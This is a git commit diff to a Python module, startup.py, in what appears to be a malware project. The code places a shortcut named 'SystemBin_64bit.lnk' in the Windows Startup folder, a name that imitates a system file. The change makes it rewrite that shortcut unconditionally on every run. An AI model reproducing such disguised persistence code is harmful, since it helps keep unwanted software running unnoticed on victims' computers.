99f0682e78d62467f33ea7f2e3e9366a8efba68b
Josakko <112590914+Josakko@users.noreply.github.com>
2023-05-23 20:24:47 +0200

    Update startup.py

--- modules/startup.py
+++ modules/startup.py
@@ -6,8 +6,8 @@ class Startup:
     def __init__(self, target_dir):
         shortcut_dir = f"{os.getenv('appdata')}\Microsoft\Windows\Start Menu\Programs\Startup\SystemBin_64bit.lnk"
                 
-        if not os.path.exists(shortcut_dir):
-            self.shortcut(target_dir, shortcut_dir)
+        #if not os.path.exists(shortcut_dir):
+        self.shortcut(target_dir, shortcut_dir)
 
     def shortcut(self, target, shortcut):
         shell = win32com.client.Dispatch("WScript.Shell")
